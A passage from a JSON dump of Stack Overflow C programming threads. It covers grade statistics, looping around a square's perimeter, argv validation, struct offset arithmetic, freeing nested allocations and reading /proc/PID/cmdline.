iterate once to establish initial comparable value - breaks\n        if(counter &gt; 0){\n            temp = grade;\n            if(max &gt; temp){\n                min = grade;\n            }\n\n            else{\n                max = grade;\n            }\n        }\n        //average\n        sum = grade + sum;\n        average = (float)(sum/counter);\n        counter++;\n        //standard deviation\n        sdPartOne = (grade - average);\n        sdPartTwo = sdPartOne * sdPartOne;\n        //breaks\n        sumx = sumx + sdPartTwo;\n        sdPartThree = sumx / counter;\n        standardD = sqrt(sdPartThree);\n\n    }\n\n    while(buffer[0] != '\\n'); \n\n    printf(\"\\t%f\", sdPartOne);\n    printf(\"\\t%f\", sdPartTwo);\n    printf(\"\\t%f\", sumx);\n    printf(\"\\t%f\", sdPartThree);\n    printf (\"\\n%d\", counter - 1);\n    printf(\"\\t%d\", max);\n    printf(\"\\t%d\", min);\n    printf(\"\\t%f\", average);\n    printf(\"\\t%f\", standardD);\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518582299, "post_id": 48779644, "comment_id": 84560897, "body": "<code>for (...) { for (...) { for (...) { ... } } }</code>?"}, {"owner": {"reputation": 198293, "user_id": 707111, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/oXZkh.jpg?s=128&g=1", "display_name": "Ry-", "link": "https://stackoverflow.com/users/707111/ry"}, "edited": false, "score": 2, "creation_date": 1518582525, "post_id": 48779644, "comment_id": 84560966, "body": "You could put the body in a function or a macro. Apart from that\u2026 it\u2019s C. It doesn\u2019t have much."}, {"owner": {"reputation": 507, "user_id": 2654727, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c319a24a493153df59e86b43ff78fde0?s=128&d=identicon&r=PG", "display_name": "Tom Drake", "link": "https://stackoverflow.com/users/2654727/tom-drake"}, "edited": false, "score": 0, "creation_date": 1518590327, "post_id": 48779644, "comment_id": 84563528, "body": "Perhaps you should look at Logo - <a href=\"https://en.wikipedia.org/wiki/Logo_(programming_language)\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Logo_(programming_language)</a>"}], "answers": [{"tags": [], "owner": {"reputation": 610, "user_id": 8979940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmzYf.jpg?s=128&g=1", "display_name": "Omer Dagan", "link": "https://stackoverflow.com/users/8979940/omer-dagan"}, "is_accepted": false, "score": 1, "last_activity_date": 1518591340, "creation_date": 1518591340, "answer_id": 48781311, "question_id": 48779644, "link": "https://stackoverflow.com/questions/48779644/loop-with-multiple-headers/48781311#48781311", "title": "Loop with multiple headers", "body": "<p>As for your specific question - there isn't anything that implementes that directly AFAIK but.. I wrote some code in the university for this issue and maybe you can use that as a basis</p>\n\n<p>basically you can calculate the coordinates from a single iterator - it's a nasty code but maybe it will help with your issue</p>\n\n<p>It will print out the square coordinates of a 10x10 square (1 indexed)</p>\n\n<pre><code>#define WIDTH 10\nint main()\n{\n    int iter = 0;\n    int x = 0,y = 0;\n    while ( iter &lt; (WIDTH*4) ) {\n        if ( iter &lt; WIDTH ) {\n            x = iter;\n            y = 0;\n        } else if ( iter &gt;= WIDTH &amp;&amp; iter &lt; ( 2 * WIDTH ) ) {\n            x = WIDTH -1;\n            y = (iter % WIDTH) ;\n        } else if ( iter &gt;= (2 * WIDTH) &amp;&amp; iter &lt; ( 3 * WIDTH ) ) {\n            x = (WIDTH) - (iter - (2 * WIDTH)) - 1;\n            y = WIDTH - 1;\n        } else {\n            x = 0;\n            y = (4 * WIDTH) - iter - 1;\n        }\n        printf(\"(%d, %d) \", x+1 ,y+1 );\n        iter++;\n    }\n    printf(\"\\n\");\n\n    return 0;\n}\n</code></pre>\n\n<p>NOTE: the corner coordinates are repeated</p>\n"}], "owner": {"reputation": 1130, "user_id": 2043876, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/49492119d7a66e43e549f0ff04d55598?s=128&d=identicon&r=PG", "display_name": "Tony Ruth", "link": "https://stackoverflow.com/users/2043876/tony-ruth"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 74, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1518591340, "creation_date": 1518582236, "last_edit_date": 1518582636, "question_id": 48779644, "link": "https://stackoverflow.com/questions/48779644/loop-with-multiple-headers", "title": "Loop with multiple headers", "body": "<p>I frequently run into problems where the same code inside a loop is repeated, but several loops are needed. A simple example is moving around the edge of a square. </p>\n\n<pre><code>/*This code moves the variables x and y around the outside of a square counterclockwise starting from the origin.*/\nfor(y=0,x=0,x&lt;width;x++);\nfor(,y&lt;width;y++);\nfor(,x&gt;0;x--);\nfor(,y&gt;0;y--);\n</code></pre>\n\n<p>However, usually you need to do something with the coordinates of the square repeatedly. That means making 4 separate scopes with the same code repeated in each. Is there some code that allows you to use multiple sequential looping conditions? That code might look like this:</p>\n\n<pre><code>[  for(y=0,x=0,x&lt;width;x++),    for(,y&lt;width;y++),    for(,x&gt;0;x--),    for(,y&gt;0;y--)  ]\n{\n    //Do something over the perimeter of the square E.g. color in a pixel \n}\n</code></pre>\n\n<p>I know there are iterators, but I think they are cumbersome compared to being able to concatenate loops. Are there any languages that do have a repeated loop structure like this?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1518579481, "post_id": 48779219, "comment_id": 84560148, "body": "Don&#39;t use <code>argv[i]</code> before you have checked that <code>argv &gt; i</code>. For example if no arguments are provided then <code>argv[1]</code> will be a null pointer, and <code>argv[2]</code> will be out of bounds. If one argument is provided then <code>argv[2]</code> will be a null pointer. Think about what happens with the <code>atoi</code> call if <code>argv[2]</code> is out of bounds or a null pointer."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1518579597, "post_id": 48779219, "comment_id": 84560178, "body": "Rather than returning a <code>bool</code> from your <code>validate()</code>, instead return an <code>int</code> representing which case the inputs satisfy and then <code>switch</code> on the return using the <code>default</code> case for your <i>invalid input</i> case. (**note you can break your string literals <code>&quot;I need to print this long stuff&quot;</code> into separate lines <code>&quot;I need &quot;</code> then <code>&quot;to print &quot;</code> and <code>&quot;this long stuff&quot;</code> to make your code much more readable. C ignores the newlines."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518579631, "post_id": 48779219, "comment_id": 84560185, "body": "Also, if <code>helpManual</code> returns <code>true</code>, then you should probably not let the program continue, like you do now."}, {"owner": {"reputation": 11, "user_id": 9357951, "user_type": "registered", "profile_image": "https://graph.facebook.com/10215291258730652/picture?type=large", "display_name": "Brian Ho", "link": "https://stackoverflow.com/users/9357951/brian-ho"}, "edited": false, "score": 0, "creation_date": 1518580273, "post_id": 48779219, "comment_id": 84560353, "body": "Thankyou so much guys. Let me try your suggestions and solutions and i shall get back to you guys. You&#39;re the best guys! and shout out to C_elegans and Ken White for edits"}], "owner": {"reputation": 11, "user_id": 9357951, "user_type": "registered", "profile_image": "https://graph.facebook.com/10215291258730652/picture?type=large", "display_name": "Brian Ho", "link": "https://stackoverflow.com/users/9357951/brian-ho"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 57, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1518580122, "creation_date": 1518579260, "last_edit_date": 1518580122, "question_id": 48779219, "link": "https://stackoverflow.com/questions/48779219/program-constantly-crashes-requiring-an-argument-count-of-at-least-3", "title": "Program constantly crashes requiring an argument count of at least 3", "body": "<p>Im suppose to write a program that validates CLI command. My program sort of works when there are two parameters but when i add the third, it crashes. I've been stuck for hours.Your help will be greatly appreciated! :D</p>\n\n<p><a href=\"https://i.stack.imgur.com/Ry8eD.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Ry8eD.png\" alt=\"Commands\"></a></p>\n\n<p><strong>This is what im supposed to do.</strong>\nInstructor recommended me to break my solution into 3 functions:</p>\n\n<ul>\n<li><p>validate command: this function takes the command line arguments and\nvalidates that they represent a valid command for the system. Return a Boolean\nindicating if the command was valid or not.</p></li>\n<li><p>print help: this function prints a complete usage (help) message for the user</p></li>\n<li><p>main: the main function uses the above to validate the command, and then\nperform an n-way branch or switch to select the correct option and print a\nsuitable message.</p></li>\n</ul>\n\n<p>Ive put a comment block in the validArgue function trying to isolate and debug it</p>\n\n<p><strong>Heres my code</strong></p>\n\n<pre><code>/*\n * Assignment 2 Encryption part 1\n * Author : Brian HO\n * Date: 12/02/2018\n *\n */\n\n #include &lt;stdio.h&gt;\n #include &lt;stdlib.h&gt;\n #include &lt;stdbool.h&gt;\n #include &lt;string.h&gt;\n\n bool validArgue(char* input, int length,char* string);\n bool helpManual(char* input);\n\n     int main(int argc, char* argv[]) {\n\n    char* input = argv[1];\n    int length = atoi(argv[2]);\n    char* string = argv[2];\n\n    if(helpManual(input)) {\n        printf(\"\\nUsage:   encrypt -k 123\\n   or:   encrypt -f textfile.txt\\n   or:   enctypt -e/d textfile.txt keyfile.txt\\n\\n\\tOptions:\\n\\t\\t-h\\t\\t\\tPrint this help manual.\\n\\t\\t-k &lt;length&gt;\\t\\tGenerate encryption key for given length (length &gt; 0).\\n\\t\\t-f &lt;filename&gt;\\t\\tGenerate frequency histogram for filename.\\n\\t\\t-e &lt;filename&gt; &lt;keyfile&gt; Encrypt cleartxt in filename with given keyfile.\\n\\t\\t-d &lt;filename&gt; &lt;keyfile&gt; Decipher ciphertext filename with given keyfile.\\n\\n\");\n    }\n    if(validArgue(input,length,string)){\n        printf(\"Command is valid!\");\n    }\n    else {\n        printf(\"Invalid arguments...\\n\\nUsage:   encrypt -k 123\\n   or:   e \n    ncrypt -f textfile.txt\\n   or:   enctypt -e/d textfile.txt \n    keyfile.txt\\n\\n\\tOptions:\\n\\t\\t-h\\t\\t\\tPrint this help manual.\\n\\t\\t-k \n    &lt;length&gt;\\t\\tGenerate encryption key for given length (length &gt; 0).\\n\\t\\t-f \n    &lt;filename&gt;\\t\\tGenerate frequency histogram for filename.\\n\\t\\t-e &lt;filename&gt; \n    &lt;keyfile&gt; Encrypt cleartxt in filename with given keyfile.\\n\\t\\t-d \n    &lt;filename&gt; &lt;keyfile&gt; Decipher ciphertext filename with given keyfile.\");\n    }\n    return 0;\n}\n\n\nbool helpManual(char* input) {\n    char ch1 = input[0];\n\n\n    char ch2 = input[1];\n    if(ch1 == '-' &amp;&amp; ch2 == 'h'){\n        return true;\n    }\n    else {\n        return false;\n     }\n }\n\nbool validArgue(char* input, int length, char* string){\n    char ch = string[1];\n    if (strcmp(input, \"-h\")==0){\n        return true;\n    }\n    else if (strcmp(input, \"-k\")==0) {\n        if (length &gt;0) {\n            return true;\n        }\n        else \n            return false;\n    }\n    else if (strcmp(input, \"-f\")==0) {\n        if (ch&gt;0) {\n            return true;\n        }\n        else\n            return false;\n    }\n      else \n        return false;\n}\n</code></pre>\n"}, {"tags": ["c", "casting", "structure", "pointer-arithmetic"], "comments": [{"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 1, "creation_date": 1518577877, "post_id": 48779028, "comment_id": 84559732, "body": "Instead of calculating the offsets yourself, use <a href=\"http://en.cppreference.com/w/c/types/offsetof\" rel=\"nofollow noreferrer\"><code>offsetof</code></a>"}, {"owner": {"reputation": 13, "user_id": 3197717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cacad0a6bddf71e94d39501c72ef3aa8?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel", "link": "https://stackoverflow.com/users/3197717/gabriel"}, "reply_to_user": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518578407, "post_id": 48779028, "comment_id": 84559867, "body": "@Pablo - I didn&#39;t even know the function. I&#39;m going to read about it. Gracias!"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518578518, "post_id": 48779028, "comment_id": 84559889, "body": "<code>288&#47;8&#47;8 = 4</code>. That&#39;s all there is to it. Pointer arithmetic does the division, and then you divide again."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 3197717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cacad0a6bddf71e94d39501c72ef3aa8?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel", "link": "https://stackoverflow.com/users/3197717/gabriel"}, "edited": false, "score": 0, "creation_date": 1518579356, "post_id": 48779135, "comment_id": 84560109, "body": "That&#39;s my point. Maths are done in whatever you cast it to. If you want the results in chars, just divide by <code>sizeof (chosen-type)</code>. It&#39;s exactly what I did in the former 8 lines. Even more, if I did cast the other 8 lines to something else, they would still yield the right value. But doing it to the correct type here doesn&#39;t seem to work and I don&#39;t understand why. Thanks!"}, {"owner": {"reputation": 356, "user_id": 4485708, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hwfmt.png?s=128&g=1", "display_name": "Whilom Chime", "link": "https://stackoverflow.com/users/4485708/whilom-chime"}, "reply_to_user": {"reputation": 13, "user_id": 3197717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cacad0a6bddf71e94d39501c72ef3aa8?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel", "link": "https://stackoverflow.com/users/3197717/gabriel"}, "edited": false, "score": 0, "creation_date": 1518581016, "post_id": 48779135, "comment_id": 84560553, "body": "I&#39;m curious how you intend to be using these offsets, as indexes from a <code>(char *)</code> address, or as indexes from a <code>(member-type *)</code> address, i.e.  for customer_creation_date you&#39;d do something like <code>((time_t *)&amp;customer)[offset[8]]</code> as opposed to <code>((char *)&amp;customer)[offset[8]]</code>  In either case you don&#39;t need the <code>&#47; sizeof((type))</code>s  in the first case  <code>((char *)&amp;customers[0].&lt;field&gt; - (char *)customers</code>  (which is what <code>offset</code> will do) will work, and if you intend the second case then  <code>&amp;customers[0].&lt;field&gt; - (&lt;field-type&gt; *)customers</code>  will work."}, {"owner": {"reputation": 13, "user_id": 3197717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cacad0a6bddf71e94d39501c72ef3aa8?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel", "link": "https://stackoverflow.com/users/3197717/gabriel"}, "edited": false, "score": 0, "creation_date": 1518607041, "post_id": 48779135, "comment_id": 84573019, "body": "Yes, it&#39;d be easier to just use pointers or deference each entry individually. What I didn&#39;t mention is that once I find a match in any of the fields, when doing a look up, I&#39;m planing to copy the whole entry to dynamically allocated position in memory. After using <code>memcpy</code> to copy this whole entry of my table to memory, the structure would no longer exists (in the new memory chunk), hence there is no way to read a particular field in the recently copied <code>customers</code>. Not with pointers or through member naming. Only by offsets. I&#39;m opened to suggestions btw. Thanks!"}, {"owner": {"reputation": 356, "user_id": 4485708, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hwfmt.png?s=128&g=1", "display_name": "Whilom Chime", "link": "https://stackoverflow.com/users/4485708/whilom-chime"}, "reply_to_user": {"reputation": 13, "user_id": 3197717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cacad0a6bddf71e94d39501c72ef3aa8?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel", "link": "https://stackoverflow.com/users/3197717/gabriel"}, "edited": false, "score": 0, "creation_date": 1518617107, "post_id": 48779135, "comment_id": 84579844, "body": "I&#39;m curious why after the <code>memcpy()</code> only offsets will work to access the elements; I just want to clarify that you understand that you can <code>memcpy(buf, &amp;customers[j], sizeof(_Customer_struct))</code> and still access it with the structure definition, either via <code>((_Cust_struct *)buf)-&gt;customer_creation_date</code> or by having set <code>buf</code> up as a ptr to <code>_Customer_struct</code> in the first place, as in <code>buf = &amp;new_customer</code>.  Unions can also often be useful in situations like this.  Perhaps if you tell us a bit more about what the destination of the copy looks like I can suggest something more useful :)"}, {"owner": {"reputation": 13, "user_id": 3197717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cacad0a6bddf71e94d39501c72ef3aa8?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel", "link": "https://stackoverflow.com/users/3197717/gabriel"}, "edited": false, "score": 0, "creation_date": 1518626321, "post_id": 48779135, "comment_id": 84586300, "body": "I&#39;m glad you clarified that! I thought <code>memcpy</code>ing from a structure to a new location in memory wouldn&#39;t keep the structure&#39;s shape in the new location. That&#39;s why I needed offsets and not pointers. I&#39;m trying to iterate through an array of structures, each of them containing 9 elements (id, name, ...), look for a match in any of the fields, say <code>customers[x].customer_id == 7</code>, and <code>memcpy</code> the whole matching structure/S (array element), to a one expandable position in memory. All this hassle is to be able to get the members of the structure in the dynamically allocated memory"}, {"owner": {"reputation": 13, "user_id": 3197717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cacad0a6bddf71e94d39501c72ef3aa8?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel", "link": "https://stackoverflow.com/users/3197717/gabriel"}, "edited": false, "score": 0, "creation_date": 1518626430, "post_id": 48779135, "comment_id": 84586373, "body": "I&#39;m going to try what you said. If it works I&#39;m going to have to eat my posts :)  Thanks for your help!"}, {"owner": {"reputation": 356, "user_id": 4485708, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hwfmt.png?s=128&g=1", "display_name": "Whilom Chime", "link": "https://stackoverflow.com/users/4485708/whilom-chime"}, "reply_to_user": {"reputation": 13, "user_id": 3197717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cacad0a6bddf71e94d39501c72ef3aa8?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel", "link": "https://stackoverflow.com/users/3197717/gabriel"}, "edited": false, "score": 0, "creation_date": 1518631882, "post_id": 48779135, "comment_id": 84589413, "body": "You&#39;re welcome.  Structure layout is guaranteed to be consistent <b>provided that</b> the same compiler and the exact same structure definitions are used (as in the same header file was included.)  One thing to keep in mind is that structure layout sometimes includes small holes for alignment of the members, and no guarantees are made that the bytes in those holes will stay the same, or be the same for two structures initialised member by member with the same data.  Sometimes people think that if <code>memcpy()</code> can copy structures then <code>memcmp()</code> can compare them, but that is not correct!"}, {"owner": {"reputation": 13, "user_id": 3197717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cacad0a6bddf71e94d39501c72ef3aa8?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel", "link": "https://stackoverflow.com/users/3197717/gabriel"}, "edited": false, "score": 0, "creation_date": 1518635130, "post_id": 48779135, "comment_id": 84591119, "body": "I read something about alignment involving the <code>#pragma pack(push,1)</code> directive. Besides, I trying what you said and seems to work. However, I keep getting a nasty error when trying to <code>printf</code> from a <code>long</code> structure element (coincidence?) <code>warning: unknown conversion type character 0xa in format [-Wformat=]</code>. Weird! It seems to work fine if I don&#39;t try to print a <code>long</code> value, <code>int</code>s and <code>char *</code>s have no problem."}, {"owner": {"reputation": 356, "user_id": 4485708, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hwfmt.png?s=128&g=1", "display_name": "Whilom Chime", "link": "https://stackoverflow.com/users/4485708/whilom-chime"}, "reply_to_user": {"reputation": 13, "user_id": 3197717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cacad0a6bddf71e94d39501c72ef3aa8?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel", "link": "https://stackoverflow.com/users/3197717/gabriel"}, "edited": false, "score": 0, "creation_date": 1518644695, "post_id": 48779135, "comment_id": 84595933, "body": "I&#39;d have to see the format string, likely it needs a <code>&quot;%ld&quot;</code> rather than a <code>&quot;%d&quot;</code>. I&#39;m glad things are working!  <code>#pragma</code>s can affect how the compiler packs structures, but so long as the same <code>#pragma</code>s are in place for all modules compiled with references to a given structure, every instance of it will have exactly the same layout. Sometimes we think a structure definition implies some layout information resides with the structure itself, but really <code>struct</code> statements just define an &quot;access policy&quot; for the compiler to use when acting on that structure&#39;s members."}, {"owner": {"reputation": 13, "user_id": 3197717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cacad0a6bddf71e94d39501c72ef3aa8?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel", "link": "https://stackoverflow.com/users/3197717/gabriel"}, "edited": false, "score": 0, "creation_date": 1519076792, "post_id": 48779135, "comment_id": 84753210, "body": "Sorry, I&#39;ve been away for some time. It&#39;s working fine. My mistake, I was using <code>%l</code> instead of <code>%ld</code>. Regarding the former, I&#39;m seriously thinking of start reading about GCC."}], "tags": [], "owner": {"reputation": 356, "user_id": 4485708, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hwfmt.png?s=128&g=1", "display_name": "Whilom Chime", "link": "https://stackoverflow.com/users/4485708/whilom-chime"}, "is_accepted": true, "score": 0, "last_activity_date": 1518578611, "creation_date": 1518578611, "answer_id": 48779135, "question_id": 48779028, "link": "https://stackoverflow.com/questions/48779028/arithmetic-and-cast-pointers-and-structures/48779135#48779135", "title": "arithmetic and cast pointers and structures", "body": "<p>You're doing pointer math to figure the offsets, which is valid, but remember that pointer math is meant to produce an integer that can be used as an index into an array of the type the pointer is pointing to.</p>\n\n<p>so: </p>\n\n<pre><code>(&amp;customers[0].customer_creation_date - (time_t *) customers)\n</code></pre>\n\n<p>is figuring out what a hypothetical 'j' would be such that:</p>\n\n<pre><code>((time_t *)&amp;customers)[j] == &amp;customers.customer_creation_date\n</code></pre>\n\n<p>And when you cast the pointers to (char *) the pointer math is done in characters, which is what you mean.  The same applies to the customer_id, except that since it's first, it's offset is zero anyway.</p>\n"}], "owner": {"reputation": 13, "user_id": 3197717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cacad0a6bddf71e94d39501c72ef3aa8?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel", "link": "https://stackoverflow.com/users/3197717/gabriel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 102, "favorite_count": 0, "accepted_answer_id": 48779135, "answer_count": 1, "score": 0, "last_activity_date": 1518578611, "creation_date": 1518577731, "last_edit_date": 1518577922, "question_id": 48779028, "link": "https://stackoverflow.com/questions/48779028/arithmetic-and-cast-pointers-and-structures", "title": "arithmetic and cast pointers and structures", "body": "<p>I've got an array of structures define as follows.</p>\n\n<pre><code>typedef struct\n{\n    _id customer_id;          // unsigned int (4 bytes)\n    char customer_name [40];\n    char customer_surname [40];\n    char customer_vat [40];\n    char customer_add [60];\n    char customer_email [60];\n    char customer_land_phone [22];\n    char customer_mob_phone [22];\n    time_t customer_creation_date;    // long int (8 bytes)\n} _Customer_Struct;\n</code></pre>\n\n<p>and an array of structures...</p>\n\n<pre><code>_Customer_Struct customers [x];   // x is irrelevant\n</code></pre>\n\n<p>and an array of offsets to the members of my array of structures...</p>\n\n<pre><code>const size_t offset [9] =\n{\n    (&amp;customers[0].customer_id - (_id *) customers) / sizeof (_id), // stores 0\n    (&amp;customers[0].customer_name[0] - (char *) customers) / sizeof (char), // stores 4\n    (&amp;customers[0].customer_surname[0] - (char *) customers) / sizeof (char), // 44\n    (&amp;customers[0].customer_vat[0] - (char *) customers) / sizeof (char), // 84\n    (&amp;customers[0].customer_add[0] - (char *) customers) / sizeof (char), // 124\n    (&amp;customers[0].customer_email[0] - (char *) customers) / sizeof (char), // 184\n    (&amp;customers[0].customer_land_phone[0] - (char *) customers) / sizeof (char), // 244\n    (&amp;customers[0].customer_mob_phone[0] - (char *) customers) / sizeof (char), // 266\n    (&amp;customers[0].customer_creation_date - (time_t *) customers) / sizeof (time_t) // 4 what...?\n};\n</code></pre>\n\n<p>Next to each line there is a comment with the value stored for each expression. Now, take a look on the last line\n<code>(&amp;customers[0].customer_creation_date - (time_t *) customers) / sizeof (time_t)</code>. If I understand, this is supposed to cast the base address of <code>customers</code> (the array) to <strong><em>time_t</em></strong>, which equals <strong><em>long int</em></strong>,  subtract the value of its address from <code>&amp;customers[0].customer_creation_date</code>, yield a partial result of the form n*<code>(time_t)</code>, and finally divide it by the size in bytes of <code>(time_t)</code> producing the corresponding offset in bytes. Basically <strong>the same as in the former eight lines</strong>.</p>\n\n<p><strong>Question1: Why is this expression yielding 4 instead of 288?</strong></p>\n\n<p><strong>Question2: Why does it work if I cast it to char instead?</strong></p>\n\n<p><code>(char *)&amp;customers[0].customer_creation_date - (char *) customers) / sizeof (char)</code> actually produces 288.</p>\n"}, {"tags": ["c", "memory", "struct", "malloc", "free"], "answers": [{"tags": [], "owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "is_accepted": true, "score": 2, "last_activity_date": 1518601094, "last_edit_date": 1518601094, "creation_date": 1518577391, "answer_id": 48778997, "question_id": 48778911, "link": "https://stackoverflow.com/questions/48778911/c-programming-freeing-nested-multidimensional-arrays-inside-structs/48778997#48778997", "title": "C programming: Freeing nested multidimensional arrays inside structs", "body": "<p>Always remember one thing, you will pass to <code>free</code> whatever you have allocated using <code>malloc</code> and it's friends.</p>\n\n<p>Here you have passed <code>free(&amp;(stp.signals[i].intervals));</code> why do you pass the address of <code>stp.signals[i].intervals</code> it's <code>stp.signals[i].intervals</code> which contains the allocated chunk's address. (the starting address of the memory chunk that was just created using <code>*alloc</code>) So <code>free(stp.signals[i].intervals)</code>\nis the correct way to free it.</p>\n\n<p>To be precise, what you have done here is undefined behavior.</p>\n\n<p>From standard <a href=\"http://port70.net/~nsz/c/c11/n1570.html#7.22.3.3p2\" rel=\"nofollow noreferrer\">7.22.3.3p2</a></p>\n\n<blockquote>\n  <p>The free function causes the space pointed to by ptr to be deallocated, that is, made available for further allocation. If ptr is a null pointer, no action occurs. <strong><em>Otherwise, if the argument does not match a pointer earlier returned by a memory management function</em></strong>, or if the space has been deallocated by a call to free or realloc, <strong><em>the behavior is undefined</em></strong>.</p>\n</blockquote>\n"}], "owner": {"reputation": 179, "user_id": 6120593, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/7f7e8ab8ed7b9da7f84a33371a041705?s=128&d=identicon&r=PG&f=1", "display_name": "Coma", "link": "https://stackoverflow.com/users/6120593/coma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 36, "favorite_count": 0, "accepted_answer_id": 48778997, "answer_count": 1, "score": 1, "last_activity_date": 1518601094, "creation_date": 1518576557, "last_edit_date": 1518580293, "question_id": 48778911, "link": "https://stackoverflow.com/questions/48778911/c-programming-freeing-nested-multidimensional-arrays-inside-structs", "title": "C programming: Freeing nested multidimensional arrays inside structs", "body": "<p>EDIT: I'm closing this question due to poor formulation as suggested by coderredoc.</p>\n\n<p>I had a problem with a free function where I mistakenly put the address of a location an argument.</p>\n\n<pre><code>    void freeMemory(Stack stp, int n){\n    for(int i=0; i&lt;n; i++){\n        free(&amp;(stp.signals[n].intervals));\n    }\n    free(stp.signals);\n\n}\n</code></pre>\n\n<p>This is the correct code (look below for more info)</p>\n\n<pre><code>    void freeMemory(Stack stp, int n){\n    for(int i=0; i&lt;n; i++){\n        free(stp.signals[n].intervals);\n    }\n    free(stp.signals);\n\n}\n</code></pre>\n"}, {"tags": ["c", "file", "scanf", "pid"], "comments": [{"owner": {"reputation": 2955, "user_id": 3819007, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6hvpZ.png?s=128&g=1", "display_name": "visibleman", "link": "https://stackoverflow.com/users/3819007/visibleman"}, "edited": false, "score": 0, "creation_date": 1518576818, "post_id": 48778826, "comment_id": 84559482, "body": "Your question contains code did you try it? What was the result? My hunch (I haven&#39;t checked the docs) is that scanf will not terminate on \\0 for %s. It does only terminate on whitespace if I remember correctly."}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "edited": false, "score": 0, "creation_date": 1518578809, "post_id": 48778826, "comment_id": 84559969, "body": "You can easily adapt the <code>get_argv()</code> function in <a href=\"https://stackoverflow.com/a/28030139/1475978\">this answer</a>, which reads <code>&#47;proc&#47;self&#47;cmdline</code>, to read <code>&#47;proc&#47;PID&#47;cmdline</code> instead. However, if you are interested in the executable only, then use <a href=\"http://man7.org/linux/man-pages/man2/readlink.2.html\" rel=\"nofollow 